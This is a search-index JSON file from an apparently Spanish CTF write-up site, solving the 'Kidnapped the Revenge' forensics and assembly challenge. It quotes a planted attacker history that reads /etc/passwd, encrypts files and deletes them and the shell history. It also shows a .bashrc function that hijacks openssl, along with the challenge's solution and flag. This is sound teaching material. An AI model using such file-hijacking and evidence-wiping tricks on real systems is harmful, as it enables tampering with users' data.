unpackear la parte low con el registro de numero m\u00e1s bajo entre los pares (es decir, entre \nxmm1\n y \nxmm2\n, usaremos \nxmm1\n) y el de n\u00famero m\u00e1s alto para la parte high:\n\n\n\n\npunpcklwd xmm1, xmm9   \npunpckhwd xmm2, xmm9   \npunpcklwd xmm3, xmm9   \npunpckhwd xmm4, xmm9   \npunpcklwd xmm5, xmm9   \npunpckhwd xmm6, xmm9   \npunpcklwd xmm7, xmm9   \npunpckhwd xmm8, xmm9\npunpcklwd xmm10, xmm9\npunpckhwd xmm11, xmm9\n\n\n\n\n\n\nxmm9\n no tiene mucho sentido ponerlo adelante, adem\u00e1s de que parece inconsistente con todas las otras, por lo tanto, cambiemos el orden. y dejemos que la instrucci\u00f3n sea: \n\n\n\n\npunpckhwd xmm11, xmm9\n\n\n\n\n\n\nProbemos. Packemos de double word a word, usando la instrucci\u00f3n \npackusdw\n:\n\n\n\n\npackusdw xmm1, xmm2 \npackusdw xmm3, xmm4 \npackusdw xmm5, xmm6 \npackusdw xmm7, xmm8 \n\n\n\n\nEs decir, que finalmente, el nuevo c\u00f3digo ser\u00eda: \n\n\n; nasm -f elf64 simd.asm; ld -o simd simd.o\nsection     .text\nglobal      _start                              \n\n_start:                                         \n\n    movdqu  xmm1, [Parallel_processing]\n    movdqu  xmm3, [is_much_faster...You_know?]\n    movdqu  xmm5, [but_sometimes_is_difficult]\n    movdqu  xmm7, [to_understand_how_it_works.]\n\n\n    movdqu  xmm10, [Anyways_I_trust_you...]\n\n    movdqu  xmm2, xmm1\n    movdqu  xmm4, xmm3\n    movdqu  xmm6, xmm5\n    movdqu  xmm8, xmm7\n    movdqu  xmm11, xmm10\n\n    pxor xmm9, xmm9\n\n    punpcklwd xmm1, xmm9   \n    punpckhwd xmm2, xmm9   \n    punpcklwd xmm3, xmm9   \n    punpckhwd xmm4, xmm9   \n    punpcklwd xmm5, xmm9   \n    punpckhwd xmm6, xmm9   \n    punpcklwd xmm7, xmm9   \n    punpckhwd xmm8, xmm9\n    punpcklwd xmm10, xmm9\n    punpckhwd xmm11, xmm9\n\n\n    psubw xmm1, xmm10\n    psubw xmm2, xmm11\n    psubw xmm3, xmm10\n    psubw xmm4, xmm11\n    psubw xmm5, xmm10\n    psubw xmm6, xmm11\n    psubw xmm7, xmm10\n    psubw xmm8, xmm11\n\n    packusdw xmm1, xmm2 \n    packusdw xmm3, xmm4 \n    packusdw xmm5, xmm6 \n    packusdw xmm7, xmm8 \n\n\n    movdqu [Parallel_processing], xmm1\n    movdqu [is_much_faster...You_know?], xmm3\n    movdqu [but_sometimes_is_difficult], xmm5\n    movdqu [to_understand_how_it_works.], xmm7\n\n    mov     ecx, Parallel_processing  \n    mov     edx, 0x40\n    mov     ebx,1                               \n    mov     eax,4                               \n    int     0x80                                \n\n    mov     eax,1                               \n    int     0x80                                \n\n\nsection     .data\nParallel_processing dq 0x7e7618131b332312, 0xb5db2d5e4333690e\nis_much_faster...You_know? dq 0x487bdfe02d301eee, 0x9db0232038f9321e\nbut_sometimes_is_difficult dq 0x4a47dbdf5e07f2f5, 0x6caaef1f3ef1312f\nto_understand_how_it_works. dq 0x5078dd0e61071ff0, 0x5a9adf0f28e0206b\nAnyways_I_trust_you... dq 0x1715ABADFACEBABE\nWhats_wrong_in_this_code? dq 0x3A7ABEEF08C0FFEE \n\n\n\n\nSi compilamos este programa y lo corremos, obtendremos el flag:\n\n\nThe flag is:ona{0db234f102901d6c789c2023A11600022e9fa1c9}", 
            "title": "Kidnapped the Revenge"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#kidnapped", 
            "text": "Category: Miscellaneous  Points: 500/500", 
            "title": "Kidnapped"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#enunciado", 
            "text": "Parece un chiste.. \nEl a\u00f1o pasado me hicieron lo mismo. Me queda tiempo hasta el 28 de septiembre para entregar un trabajo de la misma materia (que recurs\u00e9 ya que nadie pudo ayudarme el a\u00f1o pasado) \"Programaci\u00f3n en assembler\". Ya estoy empezando a sospechar que alguno de ustedes me quiere hacer pasar muchos malos momentos.   En fin.. me pas\u00f3 algo muy parecido al a\u00f1o pasado. Hab\u00eda terminado con el trabajo, estaba por hacer un backup, cuando de repente.. mi pc se volvi\u00f3 loca. Aparecieron archivos, archivos mios se borraron, ahora hay archivos con extensiones \".enc\" ... no entiendo nada.   Por favor, dame una mano con esto. Necesito de una vez por todas terminar esta materia. El que me hizo esto, me dej\u00f3 una nota.. Capaz eso les ayuda? \nLes dejo un pedazo (fijense que pesa solo 15 MB, osea no trabajen sobre esa imagen porque se van a quedar sin lugar) de mi disco. Espero que les sirva de algo. \nGracias", 
            "title": "Enunciado"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#file", 
            "text": "disk img", 
            "title": "File"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#parte-1-desencriptando-files", 
            "text": "El challenge simplemente provee una imagen de un disco. \nPor lo tanto, montemos esta imagen:   sudo mount -o rw file.img /mnt/challenge  Ejecutemos un  ls -R  para ver que files interesantes tenemos:   Parece ser un home directory de alguna distribuci\u00f3n de Linux. Adem\u00e1s, de las carpetas por defecto, parece ser que s\u00f3lo 3 files son interesantes:   play_for_the_key.enc  tarea_secuestrada.asm.zip.enc  nota   La nota, dice:  No es f\u00e1cil terminar esta materia... te habr\u00e1s dado cuenta.. pensaste que como ya te hab\u00eda pasado el a\u00f1o pasado este a\u00f1o no te iba a volver a pasar? jaj, pobre.\n\nConsejo de amigos... aprend\u00e9 un poco m\u00e1s a proteger tu pc... \n\nEl a\u00f1o pasado te ayud\u00e9 bastante.. este a\u00f1o.. estas solito.. solo un consejo te voy a dar si queres volver a obtener tu tarea: \n\n                         Hay veces, que romper es mucho m\u00e1s dificil que aprender a jugar .\n\nEspero que sepas darte cuenta cuando haya que aplicar este principio.\n\nMucha suerte..\nAh, casi me olvidaba, te volv\u00ed a modificar un poco tu tarea asique.. vas a tener que arreglarla otra vez.. \nSaludos  Lo \u00fanico interesante ac\u00e1 parece ser la frase:  \"Hay veces, que romper es mucho m\u00e1s dificil que aprender a jugar\" .  Igulamente por ahora, no parece ser \u00fatil.   Usando el comando  ls , no vamos a listar los archivos ocultos. Si usamos el flag  \"-a\"   vamos a encontrar en el home, un file bastante interesante, el  bash_history  con el siguiente contenido:  whoami\ncd Desktop/\nls\ncat /etc/passwd\nsudo su - \ncd /home/\nsu - eldiegomaradona\nsu - elcharliedelapeople\ncrontab -e \ncd /home/alumno/\ncd facu/\ncd programacion_assembler/\ncd tarea_final/\nvim play_for_key.c\nmovcc play_for_key -o play_for_key\nvim simd.asm\nzip -er tarea_secuestrada.asm.zip simd.asm\nrm -rf simd.asm play_for_key.c\nopenssl enc -aes-256-cbc -in tarea_secuestrada.asm.zip -out tarea_secuestrada.asm.zip.enc\nopenssl enc -aes-256-cbc -in play_for_key -out play_for_key.enc\nrm -rf play_for_key\nrm -rf tarea_secuestrada.asm.zip\nvim nota\ncd ~\nrm .bash*\nlogout  Por lo que vemos, el atacante:   Trat\u00f3 de loguearse con algunos usuarios.  Abri\u00f3 el file de configuraci\u00f3n de los crons, habr\u00e1 modificado algo? (no tenemos nada para confirmarlo).  Cre\u00f3/edit\u00f3 un file llamado play_for_key.c ( vim play_for_the_key.c ).  Lo compilo? Con algo raro? ( movcc play_for_key -o play_for_key ).  Cre\u00f3/edit\u00f3 un file llamado simd.asm, ser\u00e1 la tarea? ( vim simd.asm ) .  Zipea el file con password, y ac\u00e1 podemos confirmar que es la tarea ( zip -er tarea_secuestrada.asm.zip simd.asm ).  Elimina los files con c\u00f3digo fuente ( rm -rf simd.asm play_for_key.c ).  Encripta ambos files, sin proporcionar password! ( ambas lineas de openssl )  Elimina dicho files, es decir, s\u00f3lo deja los encriptados ( ambas lineas de rm )  Elimina todo los files que comiencen con .bash ( rm .bash )   Si tratamos de desencriptar los files de extensi\u00f3n .enc, no vamos a poder ya que nos pide una password. Dado que en los comandos para encriptar los files no se utiliz\u00f3 el flag  \"-k\" , para especificar la password en el comando propiamente, entonces podemos asumir que la password fue ingresada en modo interactivo, y por lo tanto no va a haber registro de ella.  Una de las posibilidades ac\u00e1 seria tratar de bruteforcear la password... Pero en general, al menos desde mi punto de vista, yo har\u00eda esto cuando se me acaban las opciones.   En este caso, podemos ver que se borraron varios archivos. Por lo tanto, podr\u00edamos usar alguna suite de forensia con el objetivo de recuperar los files eliminados, como por ejemplo,  photorec .   Con photorec, se puede recuperar al menos un archivo. Ese archivo, parece ser el  .bashrc  del usuario, y entre sus l\u00edneas, tiene lo siguiente:  # enable some nice features\nopenssl(){\n    ba=$4\n    /usr/bin/openssl $1 $2 $3 $4 $5 $6 -k $(for i in {1..100}; do echo -n ${#ba}; done)\n}  Esto quiere decir que, basicamente, el atacante cre\u00f3 un alias con el mismo nombre que el comando  openssl , redefiniendo su acci\u00f3n. En resumen, lo que esta haciendo eso, es agregar la password de encripci\u00f3n con el flag  \"-k\"  cada vez que se llama al comando  openssl . Dicha password es la longitud del nombre del file pasado por par\u00e1metro, repetido 100 veces. La longitud del string  play_for_the_key  es 16 y de  tarea_secuestrada.asm.zip  es 25. Por lo tanto, los siguientes comandos, vamos a poder desencriptar ambos files:  /usr/bin/openssl enc -d -aes-256-cbc -in tarea_secuestrada.asm.zip.enc -out tarea_secuestrada.asm.zip -k 25252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525\n\n/usr/bin/openssl enc -d -aes-256-cbc -in play_for_the_key.enc -out play_for_the_key -k 16161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616  Tener que la salida de estos comandos deber\u00eda ser almacenada afuera del disco, ya que s\u00f3lo tiene 15 MB", 
            "title": "Parte 1: Desencriptando files"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#parte-2-jugar-a-veces-es-mas-facil", 
            "text": "En este momento tenemos 2 files imporatantes:   play_for_the_key : Un binario de 32 bits. Que cuando lo ejecutamos parece que nos pide respuestas a unas \"preguntas\".    tarea_secuestrada.zip : Un archivo ZIP con password.   En este momento uno podr\u00eda tratar de bruteforcear la password del ZIP quiz\u00e1s usando JTR o Hashcat o cualquier otra tool para crackear password de un ZIP. Pero, dado que existe un binario con un nombre bastante claro, se puede intuir que el camino al menos l\u00f3gico, ser\u00eda tratar de conseguir la key usando dicho binario.", 
            "title": "Parte 2: Jugar, a veces es m\u00e1s facil"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#play-for-the-key", 
            "text": "Cuando ejecutamos el binario, el siguiente mensaje aparece:  Ingresa la respuesta n\u00famero 1:  A esta altura no tenemos ni idea que significa esto. Si empezamos a probar y fallamos, el mensaje  \"Nop!\"  se imprimir\u00e1 en la pantalla. En cambio, si ponemos la respuesta correcta, nos pedir\u00e1 la respuesta a la siguiente pregunta:   Pero \u00bfC\u00f3mo sabemos cuantas pregunta son? \u00bfCu\u00e1l es la repuesta correcta?   Una opci\u00f3n v\u00e1lida en este momento ser\u00eda tratar de reversear el binario y ver qu\u00e9 est\u00e1 haciendo. Para este ejemplo, voy a usar  Binary Ninja . Sin embargo, cuando vamos a ver el graph view del binario, vemos algo bastante extra\u00f1o.. Solo existe un basic block. Si seguimos mirando, vamos a notar que s\u00f3lo hay instrucciones  MOV :   \u00bfQu\u00e9 est\u00e1 pasando?. Si volvemos atr\u00e1s un poco y revisamos otra vez el  bash_history  vamos a darnos cuenta que este binario fue compilado usando un comando llamado  movcc . El primer resultado de la b\u00fasqueda de dicho comando en Google, nos lleva a un github de una tool llamada  movfuscator . Seg\u00fan su documentaci\u00f3n, esta compila un c\u00f3digo fuente en un binario de s\u00f3lo instrucciones  MOV . Si bien desde un punto de performance y hasta de espacio que ocupa dicho binario, es bastante malo, al estar escrito s\u00f3lo con instrucciones  MOV  el reversing de este binario se vuelve muchisimo m\u00e1s tedioso.   Y aqu\u00ed se abren dos caminos:\n1. Encontramos una tool para de-movfuscar el binario.\n2. Hacemos uso del msj de la nota, y JUGAMOS en vez de tratar de romper el juego.   Vamos a ir por la opci\u00f3n 2:   Luego de probar un poco con algunos valores que ingresamos como respuestas, vamos a notar que:\n1. Para 1, la respuesta es 1.\n2. Para 2, la respuesta es 2. \n3. Para 3, la respuesta es 1. \n4. Para 4, la respuesta es 1.\n5. Para 5, la respuesta es 2.\n6. Para 6, la respuesta es 1. \n7. Para 7, la respuesta es 2.\n8. Para 8, la respuesta es 1. \n9. Para 9, la respuesta es 2.\n10. Para 10, la respuesta es 3. \n11. Para 11, la respuesta es 4.\n12. Para 12, la respuesta es 1.  Si observamos con detalle, podemos ver que el la respuesta es un numero que empieza a aumentar pero en ciertos valores vuelve a uno. Dichos valores son: 2, 3, 5, 7, 11, etc.  Es decir, parece ser un contador que cuando el n\u00famero de la pregunta es uno de esos, el contador se resetea y vuelve a empezar de 1.  Pero \u00bfQu\u00e9 tienen de com\u00fan estos n\u00fameros?  SON PRIMOS!!  Todav\u00eda no sabemos qu\u00e9 cantidad de preguntas hay, pero igualmente, podemos hacer un script que imprima un contador y que cada vez que se cruza con un n\u00famero primo, vuelva a 1. Dado que no sabemos la cantidad, podemos ir probando hasta que la encontremos. Yo arranqu\u00e9 con 15, y faltaban mas. Mi siguiente paso fue probar con 1000, y funcion\u00f3. La cantidad de preguntas finalmente eran 100.", 
            "title": "Play for the key"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#solucionador", 
            "text": "primos = []\ncontador = 1\nnumero_de_pregunta = 1\nposible_numero_de_preguntas = 1000\nfor numero_de_pregunta in xrange(1,posible_numero_de_preguntas):\n        print contador\n        if any((numero_de_pregunta % primo) == 0 for primo in primos) or numero_de_pregunta == 1:\n                contador += 1\n        else:\n                contador = 1\n                primos.append(numero_de_pregunta)", 
            "title": "Solucionador"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#intento-con-15-primos", 
            "text": "", 
            "title": "Intento con 15 primos"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#intento-con-1000-primos", 
            "text": "Si intentamos descomprimir el ZIP con esa clave, vamos a obtener un \u00faltimo file  simd.asm , que es la \u00faltima parte del challenge.", 
            "title": "Intento con 1000 primos"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#parte-3-programacion-en-assembler", 
            "text": "La \u00faltima parte del challenge implica tratar de entender qu\u00e9 hizo el atacante (qu\u00e9 modific\u00f3) para poder volver hacer que funcione otra vez.   El file original contiene:   nasm -f elf64 simd.asm; ld -o simd simd.o\nsection     .text\nglobal      _start                              \n\n_start:                                         \n\n    movdqu  xmm1, [Parallel_processing]\n    movdqu  xmm3, [is_much_faster...You_know?]\n    movdqu  xmm5, [but_sometimes_is_difficult]\n    movdqu  xmm7, [to_understand_how_it_works.]\n    movdqu  xmm10, [Anyways_I_trust_you...]\n\n    movdqu  xmm2, xmm1\n    movdqu  xmm4, xmm3\n    movdqu  xmm6, xmm5\n    movdqu  xmm8, xmm7\n    movdqu  xmm11, xmm10\n\n    pxor xmm9, xmm9\n\n    punpckhwd xmm1, xmm9   \n    punpckhwd xmm2, xmm9   \n    punpcklwd xmm3, xmm9   \n    punpckhwd xmm4, xmm9   \n    punpcklwd xmm5, xmm9   \n    punpcklwd xmm6, xmm9   \n    punpcklwd xmm7, xmm9   \n    punpckhwd xmm8, xmm9\n    punpcklwd xmm10, xmm9\n    punpckhwd xmm9 ,xmm11\n\n\n    psubw xmm1, xmm10\n    psubw xmm2, xmm11\n    psubw xmm3, xmm10\n    psubw xmm4, xmm11\n    psubw xmm5, xmm10\n    psubw xmm6, xmm11\n    psubw xmm7, xmm10\n    psubw xmm8, xmm11\n\n    packuswb xmm1, xmm2 \n    packuswb xmm3, xmm4 \n    packuswb xmm5, xmm6 \n    packuswb xmm7, xmm8 \n\n\n    movdqu [Parallel_processing], xmm1\n    movdqu [is_much_faster...You_know?], xmm3\n    movdqu [but_sometimes_is_difficult], xmm5\n    movdqu [to_understand_how_it_works.], xmm7\n\n    mov     ecx, Parallel_processing  \n    mov     edx, 0x40\n    mov     ebx,1                               \n    mov     eax,4                               \n    int     0x80                                \n\n    mov     eax,1                               \n    int     0x80                                \n\n\nsection     .data\nParallel_processing dq 0x7e7618131b332312, 0xb5db2d5e4333690e\nis_much_faster...You_know? dq 0x487bdfe02d301eee, 0x9db0232038f9321e\nbut_sometimes_is_difficult dq 0x4a47dbdf5e07f2f5, 0x6caaef1f3ef1312f\nto_understand_how_it_works. dq 0x5078dd0e61071ff0, 0x5a9adf0f28e0206b\nAnyways_I_trust_you... dq 0x1715ABADFACEBABE\nWhats_wrong_in_this_code? dq 0x3A7ABEEF08C0FFEE   Lo m\u00e1s imporante ac\u00e1 es entender qu\u00e9 est\u00e1 haciendo este c\u00f3digo, al menos una idea a alto nivel para despu\u00e9s ahondar en cada detalle. \nDividamos el c\u00f3digo en partes:", 
            "title": "Parte 3: Programaci\u00f3n en assembler"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-1", 
            "text": "movdqu  xmm1, [Parallel_processing]\n    movdqu  xmm3, [is_much_faster...You_know?]\n    movdqu  xmm5, [but_sometimes_is_difficult]\n    movdqu  xmm7, [to_understand_how_it_works.]\n    movdqu  xmm10, [Anyways_I_trust_you...]\n\n    movdqu  xmm2, xmm1\n    movdqu  xmm4, xmm3\n    movdqu  xmm6, xmm5\n    movdqu  xmm8, xmm7\n    movdqu  xmm11, xmm10\n\n    pxor xmm9, xmm9  En esta parte, simplemente est\u00e1 copiando el contenido de las etiquetas a los registros XMM (16 bytes). Luego, hace una de cada una de ellos, dejando el mismo contenido de a pares. Es decir,  xmm1  tiene el mismo valor que  xmm2 ,  xmm3  el mismo que  xmm4 , etc.. Por \u00faltimo,  xmm9  lo pone en 0.", 
            "title": "An\u00e1lisis de c\u00f3digo - Parte 1"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-2", 
            "text": "punpckhwd xmm1, xmm9   \npunpckhwd xmm2, xmm9   \npunpcklwd xmm3, xmm9   \npunpckhwd xmm4, xmm9   \npunpcklwd xmm5, xmm9   \npunpcklwd xmm6, xmm9   \npunpcklwd xmm7, xmm9   \npunpckhwd xmm8, xmm9\npunpcklwd xmm10, xmm9\npunpckhwd xmm9 ,xmm11  En esta segunda parte, se puede observar dos instrucciones distintas:   punpckhwd    punpcklwd  \u00c9stas, son parte de un conjunto de instrucciones (SSE) usados para procesamiento paralelo. \nGoogleando un poco, se puede encontrar que la funci\u00f3n  punpckhwd  divide los registros, tanto fuente como destino, en words (2 bytes) (por eso la ante \u00faltima letra,  w ). Toma las words que est\u00e1n en la parte high (por eso la letra  h  antes de la  w ) de ambos registros, y los intercala.   Lo imporante de esta parte, no es tanto entrar en detalle de c\u00f3mo es que se intercalan estrictamente, sino m\u00e1s que nada entender que:    Se est\u00e1 unpackeando words  Se est\u00e1 unpackeando o bien la parte high, o bien la parte low.  Casi  todas ellas se est\u00e1n unpackeando con 0 ( xmm9  es 0).   Si recordamos lo que se hizo en la primera parte, hab\u00eda pares de registros  xmm  que tenian el mismo valor. Si bien vemos casos en la parte 2, donde se est\u00e1 unpackeando la parte high y low de un mismo valor de registros (por ejemplo, para  xmm3  y  xmm4 ), tambi\u00e9n vemos casos donde se hace dos veces la parte high ( xmm1  y  xmm2 ). Raro..  Adem\u00e1s, vemos que la \u00faltima intrucci\u00f3n, parece unpackear al rev\u00e9s, es decir, usando el  xmm9  como registro fuente y no como destino. Otra cosa para anotar.", 
            "title": "An\u00e1lisis de c\u00f3digo - Parte 2"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-3", 
            "text": "psubw xmm1, xmm10\npsubw xmm2, xmm11\npsubw xmm3, xmm10\npsubw xmm4, xmm11\npsubw xmm5, xmm10\npsubw xmm6, xmm11\npsubw xmm7, xmm10\npsubw xmm8, xmm11  Otra instrucci\u00f3n del mismo set de procesamiento paralelo. En este caso esta instrucci\u00f3n hace una resta word a word de cada registro y almacena el resultado en el registro destino.   Obsevado este pedazo de c\u00f3digo, se puede intuir que ni  xmm11  ni  xmm10  son usados dos veces con el mismo par de registros. Es decir, todo par de registros usa una vez  xmm10  y una vez  xmm11 . \nDe hecho, por el orden y lo n\u00fameros de regitros, podr\u00edamos llegar a pensar que  xmm10  es siempre usado para la parte  low  de los pares de registros y  xmm11  para la parte  high .", 
            "title": "An\u00e1lisis de c\u00f3digo - Parte 3"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-4", 
            "text": "packuswb xmm1, xmm2 \npackuswb xmm3, xmm4 \npackuswb xmm5, xmm6 \npackuswb xmm7, xmm8   Por \u00faltimo, en esta parte, se hace el packeo otra vez para volver a la \"normalidad\". Cada par de registros, se packean juntos. \nSin embargo, dicho packeo, se hace de word a byte (por eso  wb  a lo \u00faltimo) cuando el unpackeo se hizo de word a double word... raro..", 
            "title": "An\u00e1lisis de c\u00f3digo - Parte 4"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-5", 
            "text": "movdqu [Parallel_processing], xmm1\nmovdqu [is_much_faster...You_know?], xmm3\nmovdqu [but_sometimes_is_difficult], xmm5\nmovdqu [to_understand_how_it_works.], xmm7  Se escribe dichas posiciones de memoria el valor que tienen algunos (los representantes de cada par?) de los  xmm  despu\u00e9s de hacer las operaciones.", 
            "title": "An\u00e1lisis de c\u00f3digo - Parte 5"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-6", 
            "text": "mov     ecx, Parallel_processing  \nmov     edx, 0x40\nmov     ebx,1                               \nmov     eax,4                               \nint     0x80                                \n\nmov     eax,1                               \nint     0x80                                  Finalmente, imprime por pantalla los 64 bytes que tenga la posici\u00f3n de memoria apuntada por la etiqueta  Parallel_processing .", 
            "title": "An\u00e1lisis de c\u00f3digo - Parte 6"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-resumen", 
            "text": "Hay al menos 3 cosas que parecen raras:    En el momemto de unpackear, hay algunos pares de registros que se unpackea la misma parte (high o low).   En una instrucci\u00f3n de unpackeo, se usa el  xmm9  como registro destino (no consistente con todo lo anterior).  En el momento de packear, si bien se hab\u00eda unpackeado de word a double word, se packea de word a byte.   Al ser un ejercicio de \"patching\", no queda otra que ir probando los cambios a ver como afectan. Igualmente, as\u00ed como fuimos intuyendo a lo largo del texto, podr\u00edamos hacer los cambios para l\u00f3gicos:   Cada par deberia unpackear la parte low y la parte high. C\u00f3mo saber cual deber\u00eda, podr\u00edamos probar. Sin embargo, por c\u00f3mo est\u00e1 escrito el c\u00f3digo, vamos a optar por unpackear la parte low con el registro de numero m\u00e1s bajo entre los pares (es decir, entre  xmm1  y  xmm2 , usaremos  xmm1 ) y el de n\u00famero m\u00e1s alto para la parte high:   punpcklwd xmm1, xmm9   \npunpckhwd xmm2, xmm9   \npunpcklwd xmm3, xmm9   \npunpckhwd xmm4, xmm9   \npunpcklwd xmm5, xmm9   \npunpckhwd xmm6, xmm9   \npunpcklwd xmm7, xmm9   \npunpckhwd xmm8, xmm9\npunpcklwd xmm10, xmm9\npunpckhwd xmm11, xmm9   xmm9  no tiene mucho sentido ponerlo adelante, adem\u00e1s de que parece inconsistente con todas las otras, por lo tanto, cambiemos el orden. y dejemos que la instrucci\u00f3n sea:    punpckhwd xmm11, xmm9   Probemos. Packemos de double word a word, usando la instrucci\u00f3n  packusdw :   packusdw xmm1, xmm2 \npackusdw xmm3, xmm4 \npackusdw xmm5, xmm6 \npackusdw xmm7, xmm8   Es decir, que finalmente, el nuevo c\u00f3digo ser\u00eda:   ; nasm -f elf64 simd.asm; ld -o simd simd.o\nsection     .text\nglobal      _start                              \n\n_start:                                         \n\n    movdqu  xmm1, [Parallel_processing]\n    movdqu  xmm3, [is_much_faster...You_know?]\n    movdqu  xmm5, [but_sometimes_is_difficult]\n    movdqu  xmm7, [to_understand_how_it_works.]\n\n\n    movdqu  xmm10, [Anyways_I_trust_you...]\n\n    movdqu  xmm2, xmm1\n    movdqu  xmm4, xmm3\n    movdqu  xmm6, xmm5\n    movdqu  xmm8, xmm7\n    movdqu  xmm11, xmm10\n\n    pxor xmm9, xmm9\n\n    punpcklwd xmm1, xmm9   \n    punpckhwd xmm2, xmm9   \n    punpcklwd xmm3, xmm9   \n    punpckhwd xmm4, xmm9   \n    punpcklwd xmm5, xmm9   \n    punpckhwd xmm6, xmm9   \n    punpcklwd xmm7, xmm9   \n    punpckhwd xmm8, xmm9\n    punpcklwd xmm10, xmm9\n    punpckhwd xmm11, xmm9\n\n\n    psubw xmm1, xmm10\n    psubw xmm2, xmm11\n    psubw xmm3, xmm10\n    psubw xmm4, xmm11\n    psubw xmm5, xmm10\n    psubw xmm6, xmm11\n    psubw xmm7, xmm10\n    psubw xmm8, xmm11\n\n    packusdw xmm1, xmm2 \n    packusdw xmm3, xmm4 \n    packusdw xmm5, xmm6 \n    packusdw xmm7, xmm8 \n\n\n    movdqu [Parallel_processing], xmm1\n    movdqu [is_much_faster...You_know?], xmm3\n    movdqu [but_sometimes_is_difficult], xmm5\n    movdqu [to_understand_how_it_works.], xmm7\n\n    mov     ecx, Parallel_processing  \n    mov     edx, 0x40\n    mov     ebx,1                               \n    mov     eax,4                               \n    int     0x80                                \n\n    mov     eax,1                               \n    int     0x80                                \n\n\nsection     .data\nParallel_processing dq 0x7e7618131b332312, 0xb5db2d5e4333690e\nis_much_faster...You_know? dq 0x487bdfe02d301eee, 0x9db0232038f9321e\nbut_sometimes_is_difficult dq 0x4a47dbdf5e07f2f5, 0x6caaef1f3ef1312f\nto_understand_how_it_works. dq 0x5078dd0e61071ff0, 0x5a9adf0f28e0206b\nAnyways_I_trust_you... dq 0x1715ABADFACEBABE\nWhats_wrong_in_this_code? dq 0x3A7ABEEF08C0FFEE   Si compilamos este programa y lo corremos, obtendremos el flag:  The flag is:ona{0db234f102901d6c789c2023A11600022e9fa1c9}", 
            "title": "An\u00e1lisis de c\u00f3digo - Resumen"
        }, 
        {
            "location": "/ctfs/own/eko2019/secret_spy_message/", 
            "text": "PlaceHolder", 
            "title": "Secret Spy Message"
        }, 
        {
            "location": "/ctfs/own/eko2019/secret_spy_message/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/ctfs/own/eko2019/rich_text/", 
            "text": "PlaceHolder", 
            "title": "The Rich Text"
        }, 
        {
            "location": "/ctfs/own/eko2019/rich_text/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/ctfs/own/eko2019/defuse_bomb/", 
            "text": "PlaceHolder", 
            "title": "Defuse the bomb"
        }, 
        {
            "location": "/ctfs/own/eko2019/defuse_bomb/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/ctfs/own/eko2019/guess_my_number/", 
            "text": "PlaceHolder", 
            "title": "Guess my number"
        }, 
        {
            "location": "/ctfs/own/eko2019/guess_my_number/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/tiny_tools/almost_sudo/", 
            "text": "PlaceHolder", 
            "title": "Almost sudo"
        }, 
        {
            "location": "/tiny_tools/almost_sudo/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/tiny_tools/pastemon/", 
            "text": "PlaceHolder", 
            "title": "Pastemon"
        }, 
        {
            "location": "/tiny_tools/pastemon/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/arduino/robot/", 
            "text": "PlaceHolder", 
            "title": "Robot"
        }, 
        {
            "location": "/arduino/robot/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }, 
        {
            "location": "/etw/introduction/", 
            "text": "PlaceHolder", 
            "title": "Introduction"
        }, 
        {
            "location": "/etw/introduction/#placeholder", 
            "text": "", 
            "title": "PlaceHolder"
        }
    ]
}